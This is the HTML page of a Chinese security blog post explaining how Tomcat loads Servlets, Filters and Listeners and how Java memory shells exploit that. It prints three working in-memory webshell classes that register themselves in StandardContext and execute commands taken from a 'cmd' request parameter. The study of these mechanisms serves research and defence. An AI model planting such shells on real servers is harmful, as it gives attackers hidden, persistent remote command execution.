@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>Java内存马及其机制学习 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Java内存马及其机制学习 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2021/09/27/Java内存马及其机制学习/">
+<meta property="twitter:image" content="https://blog.play2win.top/2021/09/27/Java内存马及其机制学习/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="Java内存马及其机制学习" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="Java内存马及其机制学习" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2021-09-27T06:37:53.000Z">2021-09-27</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    17 分钟 读完 (大约 2542 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                Java内存马及其机制学习
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>内存马之前有接触过，在阿里SRC的宙斯活动中薅了点羊毛，但当时只是会用，不了解他的原理。本文通过调试的方法了解内存马的原理，并实现常见的几种内存马。</p>
+<a id="more"></a>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Java-Web三大组件"><a href="#Java-Web三大组件" class="headerlink" title="Java Web三大组件"></a>Java Web三大组件</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servlet是Server Applet的缩写，即服务端小程序，可以接收客户端发送的请求，并将响应数据发送回客户端。Servlet是Java Web中最常用的一种组件，就算只用到了jsp或jspx开始，实际上也用到了Servlet，因为jsp和jspx本质上是HttpServlet，而HttpServlet又是Servlet的子类。</p>
+<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filter可以在请求到达Servlet、响应到达客户端之前，对请求或响应做处理，因此Listener常被用来实现过滤或访问控制等。</p>
+<h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listener是用来监听某一事件的，具体可实现统计在线用户数、访问统计等。Listener的种类很多，有<code>ServletContextAttributeListener</code>、<code>ServletRequestAttributeListener</code>、<code>ServletRequestListener</code>、<code>HttpSessionIdListener</code>和<code>HttpSessionAttributeListener</code>。其中<code>ServletRequestListener</code>是用来监听请求的，很适合实现内存马。</p>
+<h3 id="两种上下文"><a href="#两种上下文" class="headerlink" title="两种上下文"></a>两种上下文</h3><p>与内存马相关的两种上下文是ApplicationContext和StandardContext。ApplicationContext是实现ServletContext的类，记录的是Servlet的一些上下文信息，而StandardContext记录的是包括web.xml在内的一些Web应用信息。</p>
+<p>至于什么是Context，个人理解是与它的中文意思一样，上下文或语境，是一种小范围的环境变量，当然也因为是一个类，有相应的有方法操作这些上下文信息。</p>
+<p>Context的获取也需要提一提，因为是后续内存马的加载依赖于StandardContext，是内存马的关键。其中常用的一种方法是通过HttpServletRequest对象的<code>getServletContext</code>方法获取ServletContext对象，实际上是封装了ApplicationContent的ApplicationContextFacade，而ApplicationContext又是tomcat中时实现ServletContext接口的类，然后其中有<code>context</code>属性，存储着StandardContext对象，可以通过反射获取。</p>
+<p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 133752.png" alt></p>
+<p>如果没有request的话，还可以从线程中获取，详细分析可以看长亭一位师傅的文章：<a href="https://zhuanlan.zhihu.com/p/114625962" target="_blank" rel="noopener">Tomcat的一种通用回显方法研究</a>，除此之外还有从MBean中获取，但相对复杂一些。</p>
+<p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 135737.png" alt></p>
+<h2 id="web-xml加载和Tomcat启动流程调试"><a href="#web-xml加载和Tomcat启动流程调试" class="headerlink" title="web.xml加载和Tomcat启动流程调试"></a>web.xml加载和Tomcat启动流程调试</h2><p>大多数师傅的内存马分析文章都是从ApplicationContext的<code>addServlet</code>、<code>addFilter</code>和<code>addListener</code>方法了解Java Web三大组件的加载原理的，但本文从web.xml加载和Tomcat启动流程的角度分析内存马原理，不过实质上都是一样的，最终修改StandardCotext的内容实现的。</p>
+<p>既然是调试，要先做些准备工作，在IDEA中新建一个Java Web项目后，还需在maven中添加个<code>tomcat-embed-core</code>的依赖如下，版本则设置与本地tomcat版本相同，方便下断点和调试。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.71&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>由于对tomcat的源码没有研究，所以真不知道段点应该在哪里下，好在在网上找到篇文章叫<a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">Tomcat应用 web.xml的加载过程</a>。文中提到web.xml的加载到StandardContext由<code>org.apache.catalina.startup.ContextConfig</code>类的<code>configureContext</code>方法实现。</p>
+<p>此时在web.xml中配置三大组件如下，并在<code>configureContext</code>方法处下段点即可开始调试。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ServletDemo&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;p1ay2win&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/p1ay2win&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.FilterDemo&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;p1ay2win&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;com.p1ay2win.JavaWebMemoryShell.exploit.ListenerDemo&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure>
+<p>使用webxml对象，也就是web.xml解析后的内容，调用的方法名可得知，<code>configureContext</code>方法先后使用属性<code>context</code>，也就是StandardContext的实例，添加Fiter、Listener和Servlet。</p>
+<p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-26 232643.png" alt></p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">    Wrapper wrapper = context.createWrapper();</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setName(servlet.getServletName());</span><br><span class="line">    ...</span><br><span class="line">    wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">    ...</span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">    context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先说说Servlet加载的流程，StandardContext实例新建一个Wrapper，然后封装进Servlet名和Servlet类名的信息，在加入为StandardContext的子容器，这里对于的是web.xml中的<code>&lt;servlet&gt;</code>；接着获取ServletMapping信息，加入到StandardContext的ServletMapping中，对应的是<code>&lt;servlet-mapping&gt;</code>。</p>
+<p>在Filter的加载流程中，先后将FilterDef和FilterMap加入到StandardContext实例中，对应的是<code>&lt;filter&gt;</code>和<code>&lt;filter-mapping&gt;</code>。</p>
+<p>在Listener的加载流程中，只需将filter名加入到StandardContext实例的applicationListener中。</p>
+<p>按照上述流程，写一个Servlet的内存马是正常的，而Filter和Listener就没有生效，与ApplicationContext的<code>addFilter</code>和<code>addListener</code>方法和正常加载web.xml的StandardContext实例对比，StandardContext实例正常情况下Filter还设置了的filterConfig，而Listener还设置了applicationEventListener。</p>
+<p>对这两个属性下断点，加载了web.xml配置后，StandardContext实例还分别调用<code>listenerStart</code>和<code>filterStart</code>方法，设置了上述两个属性，所以内存马最终也需要调用<code>listenerStart</code>和<code>filterStart</code>方法才完成Listener和Filter的加载。</p>
+<p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 110219.png" alt></p>
+<p><img src="/2021/09/27/Java内存马及其机制学习/屏幕截图 2021-09-27 110946.png" alt></p>
+<p>再说一个尝试写内存马时候遇到的坑，一开始也像网上大多数的例子一样在方法里实现Servlet、Filter和Listener接口，并实例化；然后完全按照tomcat启动流程加载这三个组件的时候没效果，在一个报错页面中看到无法实例化的异常，在StandardContext实例确实也没看到这三个组件的实例。于是从StandardContext的<code>stratInternal</code>方法一步一步调，发现会使用传入的三个组件的类名进行实例化，由于是在方法里实现的三个组件的接口类，这三个组件的类属于是内部类，所以普通的反射没法实例化这三个类，导致这三个组件没法正常加载。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>此处小结总结下三个主键的加载条件</p>
+<p><strong>Servlet</strong></p>
+<ul>
+<li>Wrapper封装Servlet的信息</li>
+<li>加入Wrapper到StandardContext的children中</li>
+</ul>
+<p><strong>Filter</strong></p>
+<ul>
+<li>加入到StandardContext的filterDefs</li>
+<li>加入到StandardContext的filterMaps</li>
+<li>加入到StandardContext的filterConfigs</li>
+</ul>
+<p><strong>Listener</strong></p>
+<ul>
+<li>加入Listener对象到StandardContext的applicationEventListener中</li>
+</ul>
+<h2 id="三种内存马实现"><a href="#三种内存马实现" class="headerlink" title="三种内存马实现"></a>三种内存马实现</h2><p>这里直接贴代码了</p>
+<ul>
+<li>Servlet</li>
+</ul>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ServletDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (standardContext.findServletMapping(<span class="hljs-string">"/p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            wrapper.setServletClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">            standardContext.addServletMappingDecoded(<span class="hljs-string">"/p1ay2win"</span>, <span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c"</span> + request.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Filter</li>
+</ul>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">FilterDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> (standardContext.findFilterDef(<span class="hljs-string">"p1ay2win"</span>) == <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">            FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterDef.setFilterClass(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.setFilterName(<span class="hljs-string">"p1ay2win"</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="hljs-string">"/*"</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line">            standardContext.filterStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="hljs-string">"cmd /c "</span> + servletRequest.getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Listener</li>
+</ul>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ListenerDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="hljs-keyword">if</span> (!Arrays.asList(standardContext.findApplicationListeners()).contains(<span class="hljs-keyword">this</span>.getClass().getName())) &#123;</span><br><span class="line">            standardContext.addApplicationListener(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.listenerStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-keyword">null</span>)</span><br><span class="line">                Runtime.getRuntime().exec(sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>内存马除了使用StandardContext自带的方法加载，还可使用ApplicationContext的<code>addServlt</code>、<code>addFilter</code>和<code>addListener</code>方法加载，但之所以很少人使用这种方法，是因为<code>addXXX</code>方法都有下面这段代码，检测运行状态，不允许初始化后在添加组件。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="hljs-string">"applicationContext.addXXX.ise"</span>,</span><br><span class="line">                    getContextPath()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>既然是属性，肯定是能够通过反射的方法修改它的值，然后绕过检测的，但本文因为篇幅问题就不给出实现代码了，也因为挺简单的，有兴趣的师傅可以试试。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里插个题外话，跟一个安全研究的师兄聊天的时候聊到了内存马，我向他请教说为什么说是内存马，但Catalina目录下会生成内存马的<code>.class</code>和<code>.java</code>文件，不是无文件落地吗？还跟他探讨了一阵子。后来他意识到我是通过访问上传的jsp生成的内存马，而访问jsp文件时tomcat的机制是先从Catalina目录下找是否存在这个类，如果没有则会根据jsp文件生成HttpServlet类并编译，放到Catalina目录下，所以删除上传的jsp文件，Catalina目录下相应的内容也会被删除，但真正意义上的无文件还是通过反序列化实现。想想闹这出笑话也是6月份的时候了，感慨时间过得好快。😔</p>
+<p>原本打算在文中也加上Spring内存马的内容，奈何Spring的启动流程比Tomcat复杂太多，Tomcat的调试也搞得我够呛的了，Spring的内容还是留在后续再研究吧。通过这次学习，感觉Java安全跟代码的相关性很强。加油吧，骚年</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89</a></p>
+<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p>
+<p><a href="https://su18.org/post/memory-shell/" target="_blank" rel="noopener">https://su18.org/post/memory-shell/</a></p>
+<p><a href="https://github.com/bitterzzZZ/MemoryShellLearn" target="_blank" rel="noopener">https://github.com/bitterzzZZ/MemoryShellLearn</a></p>
+<p><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">https://landgrey.me/blog/12/</a></p>
+<p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p>
+<p><a href="https://www.cnblogs.com/colin-xun/p/10573504.html" target="_blank" rel="noopener">https://www.cnblogs.com/colin-xun/p/10573504.html</a></p>
+<p><a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">https://blog.csdn.net/lblblblblzdx/article/details/80946526</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2021/09/27/Java内存马及其机制学习/">Java内存马及其机制学习</a></li>
